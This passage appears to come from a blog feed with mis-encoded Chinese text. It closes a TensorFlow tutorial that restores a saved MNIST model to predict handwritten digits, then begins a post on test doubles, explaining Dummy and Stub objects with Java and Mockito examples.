saver.save(sess, model_path)    print(&quot;Model saved in file: %s&quot; % save_path) # Running a test dataset by loading the model saved earlierwith tf.Session() as sess:      # Run the initializer    sess.run(init)     saver.restore(sess, model_path)    print(&quot;Model restored from file: %s&quot; % save_path)         # Calculate accuracy for MNIST test images    print(&quot;Testing Accuracy:&quot;, \    sess.run(accuracy, feed_dict=&#123;X: mnist.test.images,                                      Y: mnist.test.labels&#125;))

æŠŠé€™å€‹ç¨‹å¼è·‘èµ·ä¾†ä¹‹å¾Œï¼Œä½ æ‡‰è©²å¯ä»¥çœ‹åˆ°ä»¥ä¸‹çš„è¼¸å‡ºï¼š
ros@ros-K401UB:~/code/standalone/tensorflow$ python3.4 simple_nn_store.py ^[[Z^[[ZExtracting /tmp/data/train-images-idx3-ubyte.gzExtracting /tmp/data/train-labels-idx1-ubyte.gzExtracting /tmp/data/t10k-images-idx3-ubyte.gzExtracting /tmp/data/t10k-labels-idx1-ubyte.gz2018-01-27 16:56:13.000020: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.1 SSE4.2 AVX AVX2 FMAStep 1, Minibatch Loss= 9857.0781, Training Accuracy= 0.320Step 100, Minibatch Loss= 320.8330, Training Accuracy= 0.859Step 200, Minibatch Loss= 121.9466, Training Accuracy= 0.805Step 300, Minibatch Loss= 55.0800, Training Accuracy= 0.891Step 400, Minibatch Loss= 89.7953, Training Accuracy= 0.828Step 500, Minibatch Loss= 52.5457, Training Accuracy= 0.836Optimization Finished!Model saved in file: /tmp/model.ckptModel restored from file: /tmp/model.ckptTesting Accuracy: 0.847

å°‡è¾¨è­˜æ‰‹å¯«æ•¸å­—çš„ Model è®Šæˆå¯ä»¥åƒä¸€å¼µ 28x28 çš„å½±åƒä¸¦è¼¸å‡ºç­”æ¡ˆä¸Šé¢çš„å…©æ­¥ï¼Œæˆ‘å€‘å·²ç¶“æŠŠåŸºæœ¬ç¯„ä¾‹ç”¨èµ·ä¾†ï¼Œä¸éä»–é‚„ä¸å¤ªç›´è¦ºï¼Œå› ç‚ºæˆ‘å€‘æ˜¯å¸Œæœ›è®“æ‰‹å¯«è¾¨è­˜çš„ node å¯ä»¥åƒé€²ä¸€å¼µå½±åƒï¼Œç„¶å¾Œåå‡ºçµæœï¼Œæ‰€ä»¥åœ¨é€™ä¸€æ­¥æˆ‘å€‘è¦æ”¹å¯«ä¸€ä¸‹ã€‚
ä¸€æ­¥ä¸€æ­¥ä¾†ï¼Œé¦–å…ˆæˆ‘å€‘å¯ä»¥å°‡ training çš„åœ°æ–¹æ”¹æˆç›´æ¥è®€å– train å¥½çš„ modelï¼Œç„¶å¾ŒæŠŠè¨ˆç®— accuracy çš„åœ°æ–¹æ”¹æˆç›´æ¥è¼¸å‡ºè¾¨è­˜çš„çµæœï¼š
from __future__ import print_function import tensorflow as tf from tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&quot;/tmp/data/&quot;, one_hot=True) # Parametersmodel_path = &quot;/tmp/model.ckpt&quot; # Network Parametersn_hidden_1 = 256 # 1st layer number of neuronsn_hidden_2 = 256 # 2nd layer number of neuronsnum_input = 784 # MNIST data input (img shape: 28*28)num_classes = 10 # MNIST total classes (0-9 digits) # tf Graph inputX = tf.placeholder(&quot;float&quot;, [None, num_input]) # Store layers weight &amp; biasweights = &#123;    &#x27;h1&#x27;: tf.Variable(tf.random_normal([num_input, n_hidden_1])),    &#x27;h2&#x27;: tf.Variable(tf.random_normal([n_hidden_1, n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([n_hidden_2, num_classes]))&#125;biases = &#123;    &#x27;b1&#x27;: tf.Variable(tf.random_normal([n_hidden_1])),    &#x27;b2&#x27;: tf.Variable(tf.random_normal([n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([num_classes]))&#125; # Create modeldef neural_net(x):    # Hidden fully connected layer with 256 neurons    layer_1 = tf.add(tf.matmul(x, weights[&#x27;h1&#x27;]), biases[&#x27;b1&#x27;])    # Hidden fully connected layer with 256 neurons    layer_2 = tf.add(tf.matmul(layer_1, weights[&#x27;h2&#x27;]), biases[&#x27;b2&#x27;])    # Output fully connected layer with a neuron for each class    out_layer = tf.matmul(layer_2, weights[&#x27;out&#x27;]) + biases[&#x27;out&#x27;]    return out_layer # Construct modellogits = neural_net(X)prediction = tf.nn.softmax(logits) # Evaluate model# argmax returns the index with the largest value across axes of a tensorans = tf.argmax(prediction, 1) # Initialize the variables (i.e. assign their default value)init = tf.global_variables_initializer() # &#x27;Saver&#x27; op to save and restore all the variablessaver = tf.train.Saver() # Running a test dataset by loading the model saved earlierwith tf.Session() as sess:    # Run the initializer    sess.run(init)     saver.restore(sess, model_path)    print(&quot;Model restored from file: %s&quot; % model_path)     # Calculate accuracy for MNIST test images    print(&quot;Answer:&quot;, sess.run(ans, feed_dict=&#123;X: mnist.test.images&#125;))

è·‘å‡ºä¾†ä¹‹å¾Œï¼Œä½ æ‡‰è©²æœƒçœ‹åˆ°ä¸‹åˆ—çµæœï¼š
ros@ros-K401UB:~/code/standalone/tensorflow$ python3.4 simple_nn_srv.pyExtracting /tmp/data/train-images-idx3-ubyte.gzExtracting /tmp/data/train-labels-idx1-ubyte.gzExtracting /tmp/data/t10k-images-idx3-ubyte.gzExtracting /tmp/data/t10k-labels-idx1-ubyte.gz2018-01-27 20:06:24.861211: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.1 SSE4.2 AVX AVX2 FMAModel restored from file: /tmp/model.ckptAnswer: [7 2 1 ..., 4 5 6]

ç„¶å¾Œï¼Œæˆ‘å€‘å¯ä»¥å°‡ä»–æ”¹æˆåªåƒä¸€å¼µå½±åƒï¼Œä¸¦è¼¸å‡ºé€™å¼µå½±åƒçš„è¾¨è­˜çµæœï¼š
&quot;&quot;&quot; Neural Network.A 2-Hidden Layers Fully Connected Neural Network (a.k.a Multilayer Perceptron)implementation with TensorFlow. This example is using the MNIST databaseof handwritten digits (http://yann.lecun.com/exdb/mnist/).Links:    [MNIST Dataset](http://yann.lecun.com/exdb/mnist/).Author: Aymeric DamienProject: https://github.com/aymericdamien/TensorFlow-Examples/&quot;&quot;&quot;from __future__ import print_functionimport tensorflow as tfimport matplotlib.pyplot as pltfrom tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&quot;/tmp/data/&quot;, one_hot=True)# Parametersmodel_path = &quot;/tmp/model.ckpt&quot; # Network Parametersn_hidden_1 = 256 # 1st layer number of neuronsn_hidden_2 = 256 # 2nd layer number of neuronsnum_input = 784 # MNIST data input (img shape: 28*28)num_classes = 10 # MNIST total classes (0-9 digits) # tf Graph inputX = tf.placeholder(&quot;float&quot;, [None, num_input]) # Store layers weight &amp; biasweights = &#123;    &#x27;h1&#x27;: tf.Variable(tf.random_normal([num_input, n_hidden_1])),    &#x27;h2&#x27;: tf.Variable(tf.random_normal([n_hidden_1, n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([n_hidden_2, num_classes]))&#125;biases = &#123;    &#x27;b1&#x27;: tf.Variable(tf.random_normal([n_hidden_1])),    &#x27;b2&#x27;: tf.Variable(tf.random_normal([n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([num_classes]))&#125; # Create modeldef neural_net(x):    # Hidden fully connected layer with 256 neurons    layer_1 = tf.add(tf.matmul(x, weights[&#x27;h1&#x27;]), biases[&#x27;b1&#x27;])    # Hidden fully connected layer with 256 neurons    layer_2 = tf.add(tf.matmul(layer_1, weights[&#x27;h2&#x27;]), biases[&#x27;b2&#x27;])    # Output fully connected layer with a neuron for each class    out_layer = tf.matmul(layer_2, weights[&#x27;out&#x27;]) + biases[&#x27;out&#x27;]    return out_layer # Construct modellogits = neural_net(X)prediction = tf.nn.softmax(logits) # Evaluate model# argmax returns the index with the largest value across axes of a tensorans = tf.argmax(prediction, 1) # Initialize the variables (i.e. assign their default value)init = tf.global_variables_initializer() # &#x27;Saver&#x27; op to save and restore all the variablessaver = tf.train.Saver() # Show image that we want to predictplt.imshow(mnist.test.images[0].reshape((28, 28)))plt.show()# Running a test dataset by loading the model saved earlierwith tf.Session() as sess:    # Run the initializer    sess.run(init)     saver.restore(sess, model_path)    print(&quot;Model restored from file: %s&quot; % model_path)     # Calculate the answer for the image    print(&quot;Answer:&quot;, sess.run(ans, feed_dict=&#123;X: mnist.test.images[0:1]&#125;))

è·‘èµ·ä¾†ä¹‹å¾Œï¼Œä½ æ‡‰è©²æœƒå…ˆçœ‹åˆ°é€™å€‹åœ–ç‰‡çš„è¼¸å‡ºï¼š

ç„¶å¾Œæœƒçœ‹åˆ°ä¸‹åˆ—çš„å‘½ä»¤åˆ—è¼¸å‡ºï¼š
ros@ros-K401UB:~/code/standalone/tensorflow$ python3.4 simple_nn_srv.pyExtracting /tmp/data/train-images-idx3-ubyte.gzExtracting /tmp/data/train-labels-idx1-ubyte.gzExtracting /tmp/data/t10k-images-idx3-ubyte.gzExtracting /tmp/data/t10k-labels-idx1-ubyte.gz2018-01-27 23:08:35.638018: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.1 SSE4.2 AVX AVX2 FMAModel restored from file: /tmp/model.ckptAnswer: [7]

å¯ä»¥çœ‹åˆ°è‡ªå·±çš„ model æˆåŠŸè¾¨è­˜æ•¸å­—äº†!
ç¸½çµä»Šå¤©æˆ‘å€‘ä¸€èµ·ä½¿ç”¨ TensorFlow äº†ä¸€å€‹å¯ä»¥è¾¨è­˜æ‰‹å¯«æ•¸å­—çš„ç¨‹å¼ï¼Œå…¶å¯¦é€™å€‹ç¯„ä¾‹å¯ä»¥ç”¨ä¾†åšå¾ˆå¤šäº‹æƒ…ï¼Œä¾‹å¦‚ä½ å¯ä»¥å°‡è¾¨è­˜æ‰‹å¯«æ•¸å­—çš„ç¨‹å¼è·Ÿ ROS ä¸²èµ·ä¾†ï¼Œè®Šæˆå¯ä»¥è¾¨è­˜æ‰‹å¯«æ•¸å­—çš„ nodeï¼ˆåªéœ€è¦å†ä¸²æ¥ ROSï¼‰ï¼Œç„¶å¾Œå»ºç«‹ä¸€å€‹ service ï¼Œå°±å¯ä»¥è®“å…¶ä»–äººæ‹¿åœ–ç‰‡ä¾†è·Ÿé€™å€‹ node è¦æ±‚è¾¨è­˜çµæœã€‚æˆ–æ˜¯å°‡ node è£¡é¢çš„åŠŸèƒ½å’Œè¨Šæ¯æ ¼å¼ä¿®æ”¹ä¸€ä¸‹ï¼Œå°±å¯ä»¥åšåˆ°ç‰©é«”è¾¨è­˜ã€‚ä¹‹å¾Œæœ‰æ©Ÿæœƒå†ä¸€èµ·ä¾†å¯¦ä½œã€‚
é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨å­¸ç¿’çœ‹æ¸…äº‹ç‰©çš„æœ¬è³ªèˆ‡æ”¹é€²è‡ªå·±çš„è§€å¿µ
]]></content>
      <tags>
        <tag>TensorFlow, Neural Network</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¸¬è©¦æ›¿èº«(ä¸Šç¯‡)</title>
    <url>/2018/03/02/test-double-1/</url>
    <content><![CDATA[å¦‚æœä½ åœ¨å·¥ä½œæ™‚å¯«éä¸€äº›æ¸¬è©¦ç¨‹å¼ï¼Œä¹Ÿè¨±ä½ è½éä»€éº¼æ˜¯ Mockï¼Œä½†å…¶å¯¦ Mock åªæ˜¯æ¸¬è©¦æ›¿èº«çš„å…¶ä¸­ä¸€ç¨®ï¼Œæ¸¬è©¦æ›¿èº«åŒ…å«äº† Dummyã€Mockã€Fakeã€Stubã€Spyã€‚è€Œä¸åŒèªè¨€æˆ–ä¸åŒ framework æœ‰æ™‚å€™æœƒæŠŠé¡ä¼¼çš„æ¦‚å¿µåˆåœ¨ä¸€èµ·ã€‚
æœ¬ç³»åˆ—çš„ç›®çš„æ˜¯è®“ä½ å¯«å–®å…ƒæ¸¬è©¦çš„æ™‚å€™ï¼Œå°æ‡‰ä¸åŒæƒ…æ³ï¼ŒçŸ¥é“æ‡‰è©²ç”¨å“ªä¸€ç¨®æ›¿èº«ã€‚åƒç­†è€…å¸¸ç”¨çš„ Mockito åŸºæœ¬ä¸ŠæŠŠå¤§éƒ¨ä»½çš„æ¸¬è©¦æ›¿èº«éƒ½ç”¨ Mock å–ä»£ï¼Œé›–ç„¶ç”¨èµ·ä¾†å®¹æ˜“ï¼Œä½†æˆ‘ä»¥å‰å¾ä¾†ä¸çŸ¥é“è‡ªå·±ç”¨çš„æ˜¯å“ªä¸€ç¨®æ¸¬è©¦æ›¿èº« ã€‚
å¸Œæœ›çœ‹å®Œæœ¬ç³»åˆ—çš„æ–‡ç« å¾Œï¼Œè®€è€…èƒ½å¤ åœ¨å¯«å®Œä¸€æ®µç¨‹å¼ç¢¼ä¹‹å¾Œï¼Œå°±ç«‹å³èƒ½åˆ†æå‡ºè‡ªå·±é€™æ®µç¨‹å¼ç¢¼éœ€è¦ç”¨çš„æ˜¯ä»€éº¼æ›¿èº«ä¾†é€²è¡Œæ¸¬è©¦ã€‚

åè©è§£é‡‹SUT: System Under Testã€‚å°±æ˜¯éœ€è¦è¢«æ¸¬è©¦çš„æ±è¥¿ã€‚
DOC: Depended On Componentã€‚å°±æ˜¯SUTéœ€è¦ä¾è³´çš„æ±è¥¿ã€‚
DOC éå¸¸å¸¸è¦‹ï¼Œå¹¾ä¹ç„¡å¯é¿å…ã€‚
æ¯”å¦‚èªª SUT æ˜¯ web serverã€‚é‚£ DOC å°±æ˜¯ databaseã€‚
æ¯”å¦‚èªª SUT æ˜¯ web frontedã€‚é‚£ DOC å°±æ˜¯ web serverã€‚
ä½ ä¸å¤ªå¯èƒ½æ¯å€‹å‡½æ•¸éƒ½è‡ªå·±ç©è‡ªå·±çš„ï¼Œä½ é€šå¸¸éƒ½æœƒéœ€è¦å‘¼å«åˆ¥äººçš„å‡½å¼ï¼Œä½†é€™å…¶å¯¦å°æ¸¬è©¦å¸¶ä¾†äº†è² æ“”ã€‚æ¯”å¦‚èªªä½ æ¯æ¬¡æƒ³æ¸¬è©¦ä½ çš„ webserver å¯ä¸å¯ä»¥æ–°å¢ä½¿ç”¨è€…çš„æ™‚å€™ï¼Œä½ éƒ½éœ€è¦çœŸçš„å» database å«ä»–åŠ ä¸€å€‹çµ¦ä½ ã€‚
é€™å¯¦åœ¨é–‹éŠ·å¤ªå¤§ï¼Œä¹Ÿéå¸¸ä¸å¯¦éš›ã€‚
æ¸¬è©¦æ›¿èº«çš„ç›®çš„1.ç¬¬ä¸€å€‹ä¹Ÿæ˜¯æœ€é‡è¦çš„ä¸€å€‹ï¼Œæ˜¯éš”é›¢ä½ çš„ SUTï¼Œä¸è¢«ä»»ä½• DOC å¹²æ“¾ã€‚
æˆ‘ä¸æƒ³è¦æˆ‘æ¸¬è©¦æ–°å¢ä½¿ç”¨è€…çš„æ™‚å€™ï¼Œé‚„è¦ä¿è­‰ database æ˜¯æ­£å¸¸çš„ã€‚æˆ‘ä»»ä½•æ™‚å€™éƒ½æƒ³è·‘æ¸¬è©¦ï¼Œä¸ä¾è³´ä»»ä½•äººã€‚
2.åŠ é€ŸåŸ·è¡Œæ™‚é–“ï¼Œé¿å…ä¸å¿…è¦é–‹éŠ·ã€‚
ä¸ä¾é ä»–äººä¹‹å¾Œï¼Œæ‰€æœ‰ä½ éœ€è¦çš„ DOC çš„å›å‚³å€¼éƒ½å…ˆå®šç¾©å¥½ï¼Œç•¶ç„¶åŠ å¿«äº†åŸ·è¡Œé€Ÿåº¦ã€‚
3.è®“ä½ çš„æ¸¬è©¦ Deterministicã€‚
æˆ‘ä¸æƒ³è¦åœ¨ä¸åŒæ™‚é–“æˆ–ä¸åŒç©ºé–“è£¡ï¼Œæœƒå¾—åˆ°ä¸ä¸€æ¨£çš„æ¸¬è©¦çµæœã€‚æ¯”å¦‚èªªï¼Œå°–å³°æ™‚åˆ» database load å¤ªå¤§ï¼Œå›å‚³äº†ä¸é æœŸçš„ Http status 429ã€‚é€™æ˜¯æˆ‘ä¸æƒ³åœ¨æˆ‘é æœŸè¦æ˜¯ happy case çš„æƒ…æ³æ™‚çœ‹åˆ°çš„çµæœã€‚
4.æ¨¡æ“¬ç‰¹æ®Šç‹€æ³(special case)
æ¯”ç„¡æ³•æ¸¬è©¦ happy case çš„æƒ…æ³é‚„è¦æ…˜çš„äº‹æƒ…ï¼Œæ˜¯ç„¡æ³•æ¸¬è©¦ bad caseã€‚
é€™é»ä¹Ÿå¾ˆé‡è¦ï¼Œå¦‚æœçœŸçš„é‡åˆ°äº†ä¸é æœŸçš„ç‹€æ³(æ¯”å¦‚å‰›å‰›èªªçš„ 429)ï¼Œæœ€æ…˜å°±æ˜¯ç­‰ä¸€é™£å­ï¼Œdatabase æ­£å¸¸å¾Œï¼Œå°±å¯ä»¥éäº†ã€‚
ä½†æœ‰æ™‚å€™æˆ‘å€‘å°±æ˜¯æƒ³è¦çŸ¥é“ï¼Œç•¶çœŸçš„å›å‚³ 429 çš„æ™‚å€™ï¼Œæˆ‘å€‘è™•ç†çš„æ–¹æ³•æ˜¯ä¸æ˜¯æ­£ç¢ºã€‚å¦‚æœæ²’æœ‰ test doublesï¼Œæ ¹æœ¬ç„¡æ³•ä¿è­‰é€™ç¨®ç‹€æ³ä¸€å®šç™¼ç”Ÿã€‚ä¹Ÿä¸å¯èƒ½å» DDOS è‡ªå·±çš„ database è£½é€ é€™ç¨®æƒ…æ³ã€‚
5.å¯ä»¥è®“ä½ æ¸¬è©¦åˆ°ä½ ä¸æƒ³å…¬é–‹çš„è³‡è¨Š
é€™é»å°±å²å®³äº†ã€‚ä¾†å€‹ä¾‹å­:
SUT æ˜¯ WebServerã€‚ DOC æ˜¯ database
public class WebServer &#123;  private Database database;  public void create()&#123;    database.insert()  &#125;&#125;

æ¯”å¦‚èªªé€™æ¨£ï¼Œæˆ‘æƒ³çŸ¥é“æˆ‘ webser.create çš„æ™‚å€™ï¼Œdatabase.insertçš„ç¢ºè¢«å‘¼å«ï¼Œè¦æ€éº¼æ¸¬è©¦ï¼Ÿæˆ‘ä¸æƒ³è¦é–‹æ”¾ä¸€å€‹ public function getDatabase ä¾›å¤§å®¶å­˜å– database çš„ç‹€æ…‹ï¼Œåƒ…åƒ…åªæ˜¯ç‚ºäº†æ¸¬è©¦ç”¨é€”ã€‚
è©²æ€éº¼è¾¦å‘¢ï¼Ÿé€™æ™‚å€™ä¾†ä¸€å€‹æ¼‚äº®çš„æ›¿èº«ã€‚
public class WebServerTest&#123;  @Test  public void databaseInsertedWhenServerCreate()&#123;    TestDatabase testDatabase = new TestDatabase();    WebServer webserver = WebServer(testDatabase);    webserver.create();    assertTrue(testDatabase.isInserted)  &#125;&#125;public class TestDatabase extends Database&#123;  private boolean isInserted  public void insert()&#123;    isInserted = true;  &#125;  public void isInsert()&#123;    return isInserted;  &#125;&#125;
æ³¨æ„:

TestDatabase éœ€è¦ extends Databaseï¼Œä¸ç„¶ä¸Ÿä¸é€² Webserver çš„ constructorã€‚

åŸæœ¬çš„ Database é€™å€‹ Class æ²’æœ‰ isInsert é€™å€‹å‡½å¼ï¼Œæ˜¯æˆ‘è‡ªå·±åŠ çš„ã€‚


æå®šã€‚prod ä¸Šçš„ Database å®Œå…¨ä¸ç”¨å‹•ï¼Œæˆ‘å°±å¯ä»¥çŸ¥é“ç•¶ webserver.create è¢«å‘¼å«çš„æ™‚å€™ï¼Œæˆ‘çš„çš„ç¢ºç¢ºå‘¼å«äº† database.insertã€‚
çœ‹å®Œäº†ç‚ºä»€éº¼éœ€è¦æ¸¬è©¦æ›¿èº«ä¹‹å¾Œï¼Œä¹‹å¾Œæœƒä¸€ä¸€ä»‹ç´¹æ¯å€‹æ¸¬è©¦æ›¿èº«çš„ä½¿ç”¨æ™‚æ©Ÿè·Ÿç”¨æ³•ã€‚
Dummyé¦–å…ˆç™»å ´çš„ï¼Œå°±æ˜¯æœ€ç°¡å–®çš„æ›¿èº«ï¼Œä¹Ÿå°±æ˜¯ Dummyã€‚
ç•¶æˆ‘å€‘éœ€è¦å‚³ä¸€å€‹è®Šæ•¸çµ¦æŸå€‹ method çš„æ™‚å€™ï¼Œéœ€è¦ä¸€å€‹è·Ÿ signature ä¸€æ¨£å‹æ…‹çš„è®Šæ•¸ï¼Œå¯æ˜¯é€™å€‹è®Šæ•¸ä»¥å¾Œåˆä¸æœƒç”¨åˆ°ã€‚ç‚ºäº†åŠ é€Ÿè·Ÿçœè¨˜æ†¶é«”ç©ºé–“ï¼Œæˆ‘å€‘å¯ä»¥ä¸Ÿä¸€å€‹ Dummy æ›¿èº«çµ¦é€™å€‹ methodã€‚
æ¯”å¦‚èªªï¼Œæˆ‘å€‘æƒ³è¦æ¸¬è©¦ People çš„ getNumberOfPerson é€™å€‹å‡½å¼ã€‚
public class People &#123;  private List&lt;Person&gt; persons;  public void addPerson(Person p)&#123;    persons.add(p);  &#125;  public int getNumberOfPerson()&#123;    return persons.size();  &#125;&#125;
é‚£ä½ çš„æ¸¬è©¦å¯èƒ½åŸæœ¬é•·æˆé€™æ¨£:
public class PeopleTest&#123;  @Test  public void testGetNumberOfPerson()&#123;    People people = new People();    Person person1 = new Person(&quot;John Doe&quot;, 25, address1, phoneNumber1);    Person person2 = new Person(&quot;Jane Doe&quot;, 23, address2, phoneNumber2);    people.addPerson(person1);    people.addPerson(person2);    assertEquals(2, people.getNumberOfPerson())  &#125;&#125;
å»ºä¸€å€‹ Person å¯èƒ½é–‹éŠ·éå¤§ï¼Œè€Œä¸”å¾ˆéº»ç…©ã€‚æ³ä¸” Person ä¸¦ä¸æ˜¯é€™å€‹ test çš„é‡é»ã€‚
é€™æ™‚å€™å°±è¦ä¾†å€‹ç°¡å–®çš„ Dummyã€‚
public class DummyPerson extends Person &#123;   public DummyPerson() &#123;&#125;&#125;
é€™å€‹ class çš„ç›®çš„å°±æ˜¯è¦é€šé addPerson çš„å‹åˆ¥é™åˆ¶ï¼Œæ‰€ä»¥åªè¦ extends Person å°±å¯ä»¥ã€‚
public class PeopleTestWithDummy&#123;  @Test  public void testGetNumberOfPerson()&#123;    People people = new People();    people.addPerson(new DummyPerson());    people.addPerson(new DummyPerson());    assertEquals(2, people.getNumberOfPerson())  &#125;&#125;

å°±æ˜¯é€™éº¼ç°¡å–®ï¼ŒPerson çš„å…¶ä»– method æˆ‘å€‘éƒ½å…¨éƒ¨ä¸ç®¡ï¼Œé‚£å¦‚æœ getNumberOfPerson å‘¼å«äº† Person çš„å…¶ä»– method æˆ‘å€‘ç„¡æ³•çŸ¥é“ï¼Œä½†é€™ä¹Ÿä¸æ˜¯é€™å€‹ unit test åœ¨ä¹çš„é‡é»ã€‚
ä½†å¦‚æœä½ çœŸçš„æƒ³ç¢ºä¿å…¶ä»– method ä¸æœƒè¢« callï¼Œé‚£å°±åœ¨ DummyPerson è£¡é¢è¦†å¯« Person çš„å…¶ä»– methodã€‚ç„¶å¾Œéƒ½ throw Exception å°±å¯ä»¥ã€‚
å…¶å¯¦å¾ˆå¤šäººåœ¨æ¸¬è©¦çš„æ™‚å€™ï¼Œç›´æ¥å‚³ null é€²å»ï¼Œå¦‚æœä½ è¦å‚³é€²å»çš„ function æ²’æœ‰ nullCheckï¼Œé€™ä¹Ÿæ˜¯å€‹å¯è¡Œçš„æ–¹å¼ã€‚ä½†å¦‚æœæœ‰ nullCheck é‚£é‚„æ˜¯åªèƒ½ç”¨ Dummyã€‚
Mockito - Dummyå¦‚æœä½ å¯«çš„æ˜¯ javaï¼Œä½ æœƒå¾ˆå¸¸çœ‹åˆ° Mickitoã€‚åœ¨ Mockito è£¡é¢ï¼Œå¦‚ä½•ç”Ÿä¸€å€‹ Dummy object å‘¢?
public class PeopleTestWithDummy&#123;  @Test  public void testGetNumberOfPerson()&#123;    People people = new People();    people.addPerson(mock(Person.class));    people.addPerson(mock(Person.class));    assertEquals(2, people.getNumberOfPerson())  &#125;&#125;

å°å¿ƒä¸è¦è¢«é€™è£¡çš„ mock ææ··ï¼Œä»–åªæ˜¯ syntax æ˜¯ mockï¼Œä½†åœ¨ mockito è£¡é¢ï¼Œå¦‚æœä½ åª mock ä¸€å€‹ class ä½†æ²’æœ‰çµ¦ä»–ä»»ä½•é æœŸçš„è¡Œç‚ºï¼Œä»–å°±æ˜¯å€‹dummyã€‚
æˆ‘å€‘æ˜¯ä»¥ç”¨æ³•ä¾†å€åˆ† TestDoublesï¼Œä¸æ˜¯ syntaxï¼Œå› ç‚ºå¾ˆå¤š framework ä¸æœƒç‚ºæ¯ä¸€å€‹ TestDoubles éƒ½çµ¦ä¸€å€‹å°ˆå±¬ syntaxã€‚
StubStub æ˜¯æˆ‘å€‘ä»‹ç´¹çš„æ›¿èº«ä¸­ç¬¬ä¸€å€‹å¯ä»¥è®“æˆ‘å€‘ç¨ç«‹æ¸¬è©¦ SUT çš„æ¸¬è©¦æ›¿èº«ã€‚
Stub ä½¿ç”¨æ™‚æ©Ÿç•¶æˆ‘å€‘éœ€è¦æ¸¬è©¦ä¸€å€‹ SUTï¼Œä½†æˆ‘å€‘å»ä¸æƒ³è¦ä¾è³´çœŸå¯¦çš„ DOCï¼Œæˆ‘å€‘å¯ä»¥ç”¨ Stub å»å–ä»£æˆ‘å€‘çš„ DOCã€‚
Stub ä¸¦ä¸éœ€è¦çœŸçš„è¡¨ç¾çš„è·Ÿ DOC ä¸€æ¨£ã€‚ä»–åªè¦ api é•·å¾—ä¸€æ¨£(ä¹Ÿå°±æ˜¯è¼¸å…¥è¼¸å‡ºé•·å¾—ä¸€æ¨£)ï¼Œè®“ SUT ä»¥ç‚ºæ˜¯çœŸæ­£çš„ DOC å°±å¯ä»¥ã€‚
ä¾†å€‹ä¾‹å­ï¼Œä»Šå¤©æˆ‘å€‘æƒ³æ¸¬è©¦ getSecretNumber æ˜¯ä¸æ˜¯èƒ½æ­£ç¢ºå›å‚³ã€‚
public class WebServer &#123;  private Database database;  int secretNumber;  public WebServer(Database database)&#123;    this.database = database;    secretNumber = 42;  &#125;  public int getSecretNumber(String username,String password)&#123;    return database.authorize(username, password) ?        secretNumber : -1;  &#125;&#125;public class Database &#123;  public Database()&#123;  &#125;  public boolean authorize(String username, String password)&#123;    //Connect to database    //Query database    //etc  &#125;&#125;
ç¨‹å¼ç¢¼è£¡é¢ï¼Œæˆ‘å€‘éœ€è¦å» authorizeï¼Œé€™ä¸€æ­¥æœƒèŠ±è²»å¾ˆå¤šæ™‚é–“ï¼Œé€™ä¹Ÿä¸æ˜¯ç¾åœ¨é€™å€‹æ¸¬è©¦çš„é‡é»ã€‚é€™æ™‚å€™å°±ä¾†å€‹ Stubã€‚
public class DatabaseStub extends Database &#123;  public boolean authorize(String username, String password) &#123;    return true;  &#125;&#125;public class TestWithStub&#123;  @Test  public void testGetSecretNumber()&#123;    WebServer webserver = new WebServer(new DatabaseStub());    assertEquals(42, webserver.getSecretNumber(&quot;BoYu&quot;, &quot;jyt&quot;));  &#125;&#125;

æå®šï¼Œé€™æ¨£å°±ä¸ç”¨çœŸçš„å» query databaseã€‚
Mockito - Stubæœ‰ Mockito çš„è©±ï¼Œä¸¦ä¸éœ€è¦çœŸçš„å¯«ä¸€å€‹æ–°çš„ DatabaseStubã€‚
Database databaseStub = mock(Database.class);when(databaseStub.authorize(anyString(), anyString()))    .thenReturn(true);WebServer webserver = new WebServer(databaseStub);assertEquals(42, webserver.getSecretNumber(&quot;BoYu&quot;, &quot;jyt&quot;));
ä½ æŠŠä¸€å€‹ class Mock äº†ä¹‹å¾Œï¼Œä»–çš„æ¯ä¸€å€‹ function éƒ½åªæœƒå›å‚³ nullã€‚ä½ éœ€è¦å»æŒ‡å®šä½ æœƒç”¨åˆ°çš„ method çš„è¡Œç‚º è¼¸å…¥å€¼æ˜¯ä»€éº¼å›å‚³ä»€éº¼ã€‚
æ¸¬è©¦ç‰¹æ®Šæƒ…æ³å¦‚ä»‹ç´¹æ™‚æ‰€èªªï¼Œstub é‚„èƒ½æ¨¡æ“¬æ¸¬è©¦çš„ç‰¹æ®Šç‹€æ³ã€‚
åœ¨é€™å€‹ä¾‹å­è£¡ï¼Œä½ æƒ³çŸ¥é“å¦‚æœ authorize ä¸éï¼Œæ˜¯ä¸æ˜¯å›å‚³ -1ã€‚å°±æŠŠå‰›å‰› stub çš„å›å‚³å€¼æ”¹æˆ false å°±å¯ä»¥ã€‚
Database databaseStub = mock(Database.class);when(databaseStub.authorize(anyString(), anyString()))    .thenReturn(false);WebServer webserver = new WebServer(databaseStub);assertEquals(-1, webserver.getSecretNumber(&quot;BoYu&quot;, &quot;jyt&quot;));
é‚„å¯ä»¥è®“ä½ çš„ Stub throw exceptionã€‚
when(databaseStub.authorize(anyString(), anyString()))  .thenThrow(new NullPointerException());

å®Œå…¨ä¸ç”¨ä¾è³´çœŸæ­£çš„ DOCï¼Œéš¨ä¾¿ä½ æ„›æ€éº¼ç©å°±æ€éº¼ç©ã€‚
ç•¶ä½ çš„ SUT æœ‰ä¸€äº› indirect input(ä¸¦ä¸æ˜¯åœ¨ä½ æ¸¬è©¦çš„ç¨‹å¼æä¾›çš„ inputï¼Œè€Œæ˜¯ DOC æä¾›çš„ input)ï¼Œéœ€è¦äº‹å…ˆå®šç¾©å¥½ DOC çš„å›å‚³å€¼ï¼Œå°±æ˜¯ç”¨ Stubã€‚
